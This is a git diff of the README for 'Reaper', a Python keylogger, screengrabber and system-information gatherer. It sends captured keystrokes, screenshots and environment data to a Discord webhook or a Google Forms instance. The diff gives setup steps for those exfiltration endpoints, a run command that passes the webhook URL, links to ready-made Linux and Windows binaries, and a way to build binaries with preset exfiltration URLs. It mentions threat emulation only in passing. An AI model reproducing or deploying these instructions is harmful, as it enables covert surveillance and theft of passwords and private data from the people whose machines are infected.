@@ -10,22 +10,27 @@
 [![Twitter](https://img.shields.io/badge/Twitter-eon__raider-38A1F3?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)
 
 Reaper is a **multi-platform keylogger, screengrabber and information gatherer** 
-written in Python 3. Binaries for Linux and Windows platforms can be built through 
-an embedded script that executes PyInstaller.
+written in Python 3.
 
-All captured data is exfiltrated to a **Discord** server and/or **Google Forms** instance through HTTPS.
+The **keylogger** module captures all keyboard events independently of which application is 
+being run. Keystrokes on browsers, games, messengers, etc., are all monitored. Similarly, the 
+**screenshot** module captures images from the active monitor in spite of which application 
+generates them. **System information** such as OS name, kernel version, architecture and 
+environment variables are also captured.
 
-Linux and Windows binaries are [available](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
+All data is exfiltrated to a **Discord** server and/or **Google Forms** instance through HTTPS.
+
+Linux and Windows binaries are [available for download](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
 for portability and ease of execution.
 
 ## Demo
 ![demo]()
 
-## Setup and Build
-The only requirements to set up and build are (I) a free Discord server and/or a 
-Google Forms instance and (II) building the binary with the URLs as arguments.
+## Setup and Execute
+All you need to run Reaper is a free Discord server and/or a 
+Google Forms instance.
 
-### I. Set up a Discord server and/or Google Forms instance
+### I. Set up Discord / Google Forms
 You need at least one of the methods for successful exfiltration.
 - **Discord:** Head over to https://www.discord.com and create a new Discord account and 
 server, if necessary. [Create a Webhook URL](https://www.digitalocean.com/community/tutorials/how-to-use-discord-webhooks-to-get-notifications-for-your-website-status-on-ubuntu-18-04) 
@@ -40,16 +45,18 @@ exfiltration works as long as the answer field for the first question is of type
   ![forms_setup](https://github.com/EONRaider/static/blob/9842916f424823ae8d72f8cd0e73a66371b9bcc7/reaper/forms_setup.png)
 
 ### II. Execute
-[Download the binaries for Linux/Unix or Windows systems](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
-from the dist directory and run them with the URLs of your Discord server or Google Forms instance.
+[Download Reaper](https://github.com/EONRaider/BCA-Reaper/tree/master/dist) 
+from the dist directory and run it with the URLs of your Discord server and/or Google Forms instance.
 ```shell
 ./linux_reaper --webhook YOUR-WEBHOOK-URL --forms YOUR-FORM-URL
 ```
-The same procedure works for the Windows binary.
+The same procedure works for the Windows binary. Run with `--help` for options or check 
+the [Usage](https://github.com/EONRaider/BCA-Reaper/tree/master#usage) section below.
 
 ### III. (Optional) Build your own binary
-What if you need a binary ready to exfiltrate to your own **preset Discord and 
-GoogleForms URLs** without setting them from the command line?
+What if you need a binary ready to exfiltrate to your own preset Discord and 
+Google Forms URLs on execution *without setting them from the command line*? This might prove 
+useful in a scenario of threat emulation, for example.
 
 Building the binary allows you to do just that. You just need to install all dependencies and build. 
 Dependency management works with both [Poetry](https://python-poetry.org/) (recommended) and [Virtualenv](https://virtualenv.pypa.io/en/latest/). 
